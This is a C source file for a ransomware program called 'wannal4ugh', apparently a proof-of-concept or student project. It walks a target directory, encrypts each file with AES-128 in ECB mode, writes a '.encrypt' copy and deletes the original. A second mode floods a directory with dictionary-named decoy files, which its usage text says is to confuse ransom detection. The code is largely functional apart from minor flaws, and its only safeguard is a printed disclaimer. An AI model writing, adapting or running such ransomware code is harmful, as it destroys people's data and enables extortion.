#define _XOPEN_SOURCE 700
#include <sys/types.h>
#include <dirent.h>
#include "wannal4ugh.h"
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

#define BUFSIZE 1024
#define DICTIONARY_PATH "/usr/share/dict/american-english"

/* Uncomment the next line for more verbose output */
/* #define _DEBUG_*/

void printUsage()
{
	printf("Usage: wannalaugh [vh] | -[e <directory>] | -[o <number of files>]\n");
	printf("-e <directory>: Encrypts all files in the given directory\n");
	printf("-o <filename>: Obfuscates ransom detection by creating Y files in the given directory\n");
	printf("-v: Prints the current version.\n");
	printf("-h: Prints this help message\n");
}

void printVersion()
{
	printf("wannal4ugh: Version 1.0\n");
	printf("DISCLAIMER: You should ask for permission before using this tool.");
	printf(" Author shall not be held responsible for any illegal use of his tool.\n");
}

int main(int argc, char *argv[])
{
	int opt;

	if ((opt = getopt(argc, argv, "hve:o:")) != -1)
	{
		switch (opt)
		{
		case 'e':
			printf("Ransom mode: target directory = %s\n", optarg);
			getFilenames(optarg);
			return 0;
		case 'o':
			printf("Obfuscate mode: number of files = %d\n", atoi(optarg));
			ObfuscateDir(atoi(optarg));
			return 0;
		case 'v':
			printVersion();
			exit(EXIT_SUCCESS);
			break;
		case 'h':
			printUsage();
			exit(EXIT_SUCCESS);
			break;
		default:
			printUsage();
			exit(EXIT_FAILURE);
		}
	}
	printUsage();
	exit(EXIT_FAILURE);
}

void encryptFile(char *filename)
{
	char buffer[BUFSIZE];

	unsigned char data[AES_BLOCK_SIZE];
	unsigned char encrypted_data[AES_BLOCK_SIZE];
	unsigned char *key = aes_read_key("aes_key.txt");

	printf("Encrypting file: %s\n", filename);
	FILE *fd_src = fopen(filename, "r");
	if (fd_src == NULL)
		return;

#ifdef _DEBUG_
	printf("Opened source file: %s\n", filename);
#endif

	/* create and open a new file with suffix encrypt */
	sprintf(buffer, "%s.encrypt", filename);
	FILE *fd_dest = fopen(buffer, "w");

	if (fd_dest == NULL)
		return;

#ifdef _DEBUG_
	printf("Opened destination file: %s\n", buffer);
#endif

	/* read from input file, encrypt the data and then write the encrypted
	 * data to the output file
	 */
	int bytes;
	while ((bytes = fread(data, 1, AES_BLOCK_SIZE - 1, fd_src)) != 0)
	{

		int enc_bytes = aes_encrypt(data, bytes, key, NULL, encrypted_data, AES_128_ECB);
		int i = fwrite(encrypted_data, sizeof(unsigned char), enc_bytes, fd_dest);

#ifdef _DEBUG_
		printf("Read %d bytes:\n\"%s\"\n", bytes, data);
		printf("encoded bytes: %d\n", enc_bytes);
		printf("%d bytes written of total encrypted %d\n", i, AES_BLOCK_SIZE);
		printf("Encrypted Data written:\n");
		print_hex(encrypted_data, enc_bytes);
		printf("-------------------------------------\n");
#endif
		memset(data, 0, AES_BLOCK_SIZE);
		memset(encrypted_data, 0, AES_BLOCK_SIZE);
	}
	printf("Encryption Completed!\n");

	/* clean up */
	fclose(fd_src);
	fclose(fd_dest);
	free(key);
	remove(filename);
}

void getFilenames(char *directory)
{
	DIR *dp;
	struct dirent *ep;
	dp = opendir(directory);
	char buffer[BUFSIZE];

	if (dp != NULL)
	{
		while ((ep = readdir(dp)) != NULL)
		{
			/* we don't want the .. and . links in the directory */
			if ((strcmp(ep->d_name, "..") != 0) && (strcmp(ep->d_name, ".") != 0))
			{
				sprintf(buffer, "%s%s", directory, (char *)ep->d_name);
				encryptFile(buffer);
			}
		}

		(void)closedir(dp);
	}
	else
		perror("Couldn't open the directory");
}

void ObfuscateDir(int numOfFiles)
{
	char *dict_str;
	size_t i = 0;
	int filesCreated = 0;

	if (numOfFiles < 1)
		return;

	FILE *dict_fd = fopen(DICTIONARY_PATH, "r");
	if (dict_fd == NULL)
	{
		perror("Error opening dictionary");
		return;
	}

	while (getline(&dict_str, &i, dict_fd) != -1 && filesCreated < numOfFiles)
	{
#ifdef _DEBUG_
		printf("File to be created: %s\n", token);
#endif

		/* create new file based on the dictionary */
		char *token = strtok(dict_str, "\n");
		FILE *temp_fd = fopen(token, "w");
		fclose(temp_fd);

		filesCreated++;
		/* clean up */
		free(dict_str);
		dict_str = NULL;
		i = 0;
	}
}
